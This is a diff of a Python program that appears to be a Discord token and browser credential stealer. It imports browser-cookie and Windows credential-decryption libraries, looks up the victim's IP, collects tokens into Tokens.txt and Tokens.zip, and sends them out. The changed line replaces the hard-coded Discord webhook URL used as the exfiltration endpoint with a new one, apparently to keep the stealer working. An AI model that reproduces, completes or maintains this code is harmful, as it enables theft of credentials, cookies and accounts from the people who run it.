@@ -3,7 +3,7 @@ import requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,s
 from Cryptodome.Cipher import AES
 from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
-wbz='https://discord.com/api/webhooks/1455591318146519213/yHEpkbknzmknSxA_N554x85vF97UNgqgSTSL_d5aVDMuya4Lio7m6NMO-42X3u_x7mbq'
+wbz='https://discord.com/api/webhooks/1457109715367755870/w_eGDPiuKBsFhkOOOZiYnGuALi-KtJtTBC8Cx4g51AYRhw0YE6Fe5HJqrgNFJ-zp3dc5'
 def ip():
  try:
   z = requests.get("https://ipinfo.io/json").json()
@@ -393,3 +393,4 @@ class Discord:
             os.remove("Tokens.txt")
             os.remove("Tokens.zip")
 Discord()
+
